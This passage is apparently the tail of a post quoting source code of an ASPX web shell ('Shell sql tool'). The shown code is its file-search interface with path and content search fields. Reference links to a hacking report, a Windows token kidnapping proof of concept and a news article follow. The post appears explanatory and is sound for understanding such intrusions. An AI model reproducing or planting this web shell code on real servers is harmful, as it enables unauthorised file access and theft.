&lt;td style="width:20%" align="left"&gt;&lt;asp:DropDownList runat="server" ID="Ven" AutoPostBack="False" CssClass="list"&gt;&lt;asp:ListItem Value="name"&gt;File Name&lt;/asp:ListItem&gt;&lt;asp:ListItem Value="content" Selected="True"&gt;File Content&lt;/asp:ListItem&gt;&lt;/asp:DropDownList&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr align="center"&gt;
&lt;td style="width:20%" align="left"&gt;Path&lt;/td&gt;
&lt;td style="width:60%" align="left"&gt;&lt;input type="text" class="input" id="NaLJ" runat="server" style="width:100%" /&gt;&lt;/td&gt;
&lt;td style="width:20%" align="left"&gt;&lt;asp:Button CssClass="bt" id="axy" runat="server" onclick="NBy" Text="Start" /&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/table&gt;
&lt;br/&gt;
&lt;br/&gt;
&lt;asp:Table ID="oJiym" runat="server" Width="100%" CellSpacing="0" &gt;
&lt;asp:TableRow CssClass="head"&gt;&lt;asp:TableCell Width="60%"&gt;File Path&lt;/asp:TableCell&gt;&lt;asp:TableCell Width="20%"&gt;Last modified&lt;/asp:TableCell&gt;&lt;asp:TableCell Width="20%"&gt;Size&lt;/asp:TableCell&gt;&lt;/asp:TableRow&gt;
&lt;/asp:Table&gt;
&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;div style="padding:10px;border-bottom:1px solid #fff;border-top:1px solid #ddd;background:#eee;"&gt;Copyright &copy; 2006-2009 &lt;a href="http://alikaptanoglu.blogspot.com" target="_blank"&gt;Shell sql tool&lt;/a&gt; All Rights Reserved.&lt;/div&gt;&lt;/div&gt;
&lt;/form&gt;
&lt;/body&gt;
&lt;/html&gt;
</pre>

You can read more about the script [here][3]

 [1]: http://nomoreroot.blogspot.co.nz/2008/10/windows-2003-poc-exploit-for-token.html "token kidnapping PoC"
 [2]: http://stackoverflow.com/questions/4288362/ive-been-hacked-evil-aspx-file-uploaded-called-aspxspy-theyre-still-trying
 [3]: http://www.zdnet.com/article/one-year-old-unpatched-windows-token-kidnapping-under-attack/ "ASPX Shell"